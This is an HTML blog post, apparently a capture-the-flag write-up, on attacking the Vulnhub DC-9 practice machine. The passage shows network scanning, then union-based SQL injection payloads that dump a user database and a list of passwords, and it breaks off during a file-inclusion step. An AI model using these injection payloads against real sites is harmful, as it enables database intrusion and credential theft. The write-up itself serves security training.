@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>DC-9 Walkthrough - AntuSec</title><meta name="Description" content="Blog de AntuSec, articulos sobre ctfs y ciberseguridad"><meta property="og:url" content="http://localhost:1313/en/dc-9/">
+  <meta property="og:site_name" content="AntuSec">
+  <meta property="og:title" content="DC-9 Walkthrough">
+  <meta property="og:description" content="Machine page: https://www.vulnhub.com/entry/dc-9,412/
+Download link: https://download.vulnhub.com/dc/DC-9.zip
+Dc-9 is one of the machines from vulnhub that contains the list of Tjnull, which is a list created to prepare for the OSCP exam, this machine is the first on the list with a similar level to the machines in the course that the OSCP offers.
+Network Scan The first step is to find the IP of our target, for this we use Arp-Scan, this tool allows us to scan a LAN network and discover devices connected to it.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-09-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-09-23T11:24:09+02:00">
+    <meta property="article:tag" content="Walkthrough">
+    <meta property="article:tag" content="Vulnhub">
+    <meta property="article:tag" content="TjNull">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="Medium">
+    <meta property="og:image" content="http://localhost:1313/es/dc-9/preimagen.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/es/dc-9/preimagen.png">
+  <meta name="twitter:title" content="DC-9 Walkthrough">
+  <meta name="twitter:description" content="Machine page: https://www.vulnhub.com/entry/dc-9,412/
+Download link: https://download.vulnhub.com/dc/DC-9.zip
+Dc-9 is one of the machines from vulnhub that contains the list of Tjnull, which is a list created to prepare for the OSCP exam, this machine is the first on the list with a similar level to the machines in the course that the OSCP offers.
+Network Scan The first step is to find the IP of our target, for this we use Arp-Scan, this tool allows us to scan a LAN network and discover devices connected to it.">
+<meta name="application-name" content="AntuSec">
+<meta name="apple-mobile-web-app-title" content="AntuSec">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/en/dc-9/" /><link rel="prev" href="http://localhost:1313/en/kioptrix_level_5/" /><link rel="next" href="http://localhost:1313/en/sauna/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "DC-9 Walkthrough",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/en\/dc-9\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/es\/dc-9\/preimagen.png",
+                            "width":  700 ,
+                            "height":  434 
+                        }],"genre": "posts","keywords": "Walkthrough, Vulnhub, TjNull, OSCP, Medium","wordcount":  1313 ,
+        "url": "http:\/\/localhost:1313\/en\/dc-9\/","datePublished": "2023-09-23T00:00:00+00:00","dateModified": "2023-09-23T11:24:09+02:00","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
+                    "width":  398 ,
+                    "height":  292 
+                }},"author": {
+                "@type": "Person",
+                "name": "Antu"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/en/" title="AntuSec">AntuSec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/en/posts/"> Posts </a><a class="menu-item" href="/en/tags/"> Tags </a><a class="menu-item" href="/en/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Select Language">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/es/dc-9/">Español</option><option value="/en/dc-9/" selected>English</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/en/" title="AntuSec">AntuSec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/en/posts/" title="">Posts</a><a class="menu-item" href="/en/tags/" title="">Tags</a><a class="menu-item" href="/en/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/es/dc-9/">Español</option><option value="/en/dc-9/" selected>English</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">DC-9 Walkthrough</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/en/" title="Author" rel="author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Antu</a></span>&nbsp;<span class="post-category">included in <a href="/en/categories/vulnhub/"><i class="far fa-folder" aria-hidden="true"></i>Vulnhub</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2023-09-23">2023-09-23</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1313 words&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/preimagen.png"
+        data-srcset="/es/dc-9/preimagen.png, /es/dc-9/preimagen.png 1.5x, /es/dc-9/preimagen.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/preimagen.png"
+        title="/es/dc-9/preimagen.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#network-scan">Network Scan</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#explotation">Explotation</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Machine page: <a href="https://www.vulnhub.com/entry/dc-9,412/" target="_blank" rel="noopener noreffer ">https://www.vulnhub.com/entry/dc-9,412/</a></p>
+<p>Download link: <a href="https://download.vulnhub.com/dc/DC-9.zip" target="_blank" rel="noopener noreffer ">https://download.vulnhub.com/dc/DC-9.zip</a></p>
+<p>Dc-9 is one of the machines from <a href="https://www.vulnhub.com/" target="_blank" rel="noopener noreffer ">vulnhub</a> that contains the list of <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit" target="_blank" rel="noopener noreffer ">Tjnull</a>, which is a list created to prepare for the OSCP exam, this machine is the first on the list with a similar level to the machines in the course that the OSCP offers.</p>
+<h2 id="network-scan">Network Scan</h2>
+<p>The first step is to find the IP of our target, for this we use Arp-Scan, this tool allows us to scan a LAN network and discover devices connected to it.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo arp-scan -interface eth1 -l</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled.png"
+        title="Untitled" width="731" height="209" /></p>
+<p>We have discovered that our target&rsquo;s IP is 192.168.34.5.</p>
+<p>Once the IP is obtained, we proceed to scan ports and services with nmap.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sV 192.168.34.5
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span>https://nmap.org<span class="o">)</span> at 2023-09-17 19:06 CEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> example.com <span class="o">(</span>192.168.34.5<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00052s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp filtered ssh
+</span></span><span class="line"><span class="cl">80/tcp open http Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:C1:23:27 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 6.83 seconds</span></span></code></pre></div></div>
+<p>We see that port 80 is open and Apache is running with version 2.4.38. We also see that the ssh port is filtered but little can be done with the information we have so far so we move on to view the website on port 80.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Browsing the web I see that there is a &lsquo;search&rsquo; field that performs a search for the company&rsquo;s users. The first thing that occurs to me is to test if it is vulnerable to SQLi, so I enter the following query:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; or 1=1-- -</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%201.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%201.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%201.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%201.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%201.png"
+        title="Untitled" width="389" height="696" /></p>
+<p>And I see that it is vulnerable to SQL so I proceed to obtain information from the database.</p>
+<p>First I get the number of columns by adding the null value for each column until I get a response with the following query:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select null,null,null,null,null,null-- -</span></span></span></code></pre></div></div>
+<p>Then I go on to list the databases that exist, with the following query:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select null,schema_name,null,null,null,null from information_schema.schemata-- -</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%202.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%202.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%202.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%202.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%202.png"
+        title="Untitled" width="232" height="344" /></p>
+<p>We see that the Staff and users databases exist.</p>
+<p>The next step I take is to list the tables contained in the users database</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select null,table_name,null,null,null,null from information_schema.tables where table_schema=&#39;</span><span class="n">users</span><span class="s1">&#39;-- -</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%203.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%203.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%203.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%203.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%203.png"
+        title="Untitled" width="276" height="294" /></p>
+<p>And I see that the UserDetails table exists, then I go on to list the columns of this table.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select null,column_name,null,null,null,null from information_schema.columns where table_name=&#39;</span><span class="n">UserDetails</span><span class="s1">&#39;-- -</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%204.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%204.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%204.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%204.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%204.png"
+        title="Untitled" width="256" height="693" /></p>
+<p>I get the columns id, firstname, lastname, username, password, and reg_date, so all that remains is to list the contents of the columns. With the following query I indicate that the values ​​of the username and password columns are displayed, indicating the table that belongs to the users database.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select null,CONCAT(username, &#34;:&#34; ,password),null,null,null,null from users.UserDetails-- -</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">marym:3kfs86sfd
+</span></span><span class="line"><span class="cl">julied:468sfdfsd2
+</span></span><span class="line"><span class="cl">fredf:4sfd87sfd1
+</span></span><span class="line"><span class="cl">barneyr:RocksOff
+</span></span><span class="line"><span class="cl">tomc:TC<span class="p">&amp;</span>TheBoyz
+</span></span><span class="line"><span class="cl">jerrym:B8m#48sd
+</span></span><span class="line"><span class="cl">wilmaf:Pebbles
+</span></span><span class="line"><span class="cl">bettyr:BamBam01
+</span></span><span class="line"><span class="cl">chandlerb:UrAG0D!
+</span></span><span class="line"><span class="cl">joeyt:Passw0rd
+</span></span><span class="line"><span class="cl">rachelg:yN72#dsd
+</span></span><span class="line"><span class="cl">rossg:ILoveRachel
+</span></span><span class="line"><span class="cl">monicag:3248dsds7s
+</span></span><span class="line"><span class="cl">phoebeb:smellycats
+</span></span><span class="line"><span class="cl">scooters:YR3BVxxxw87
+</span></span><span class="line"><span class="cl">janitor:Ilovepeepee
+</span></span><span class="line"><span class="cl">janitor2:Hawaii-Five-0</span></span></code></pre></div></div>
+<p>I save the credentials in a file called creds.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%205.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%205.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%205.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%205.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%205.png"
+        title="Untitled" width="282" height="576" /></p>
+<p>We obtain a list of users and passwords but they are not valid in the web login so we go on to list the Staff database in the same way that we have done with users.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select null,table_name,null,null,null,null from information_schema.tables where table_schema=&#39;</span><span class="n">Staff</span><span class="s1">&#39;-- -</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%206.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%206.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%206.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%206.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%206.png"
+        title="Untitled" width="278" height="393" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select null,column_name,null,null,null,null from information_schema.columns where table_name=&#39;</span><span class="n">Users</span><span class="s1">&#39;-- -</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%207.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%207.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%207.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%207.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%207.png"
+        title="Untitled" width="287" height="539" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sql">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">Mary</span><span class="s1">&#39; union select null,CONCAT(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,password),null,null,null,null from Users-- -</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%208.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%208.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%208.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%208.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%208.png"
+        title="Untitled" width="401" height="280" /></p>
+<p>We obtain admin user and an md5 hash. With the hash I proceed to crack it on an online website</p>
+<p><a href="https://crackstation.net/" target="_blank" rel="noopener noreffer ">https://crackstation.net/</a></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin:856f5de590ef37314e7c3bdf6f8a66dc</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%209.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%209.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%209.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%209.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%209.png"
+        title="Untitled" width="1051" height="370" /></p>
+<p>And I get the password: <strong>transorbital1</strong></p>
+<h2 id="explotation">Explotation</h2>
+<p>Login</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2010.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2010.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2010.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2010.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2010.png"
+        title="Untitled" width="364" height="238" /></p>
+<p>After logging in we see a section at the bottom of the page that says File does not exist, it seems that it is trying to load a file but it does not exist, this makes me think that it may be looking for a file in some system path so I try the next.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2011.png"
+        data-srcset="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2011.png, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2011.png 1.5x, /es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2011.png 2x"
+        data-sizes="auto"
+        alt="/es/dc-9/DC-9%205a1a383f004f41a7b065312771f311ab/Untitled%2011.png"
+        title="Untitled" width="756" height="316" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
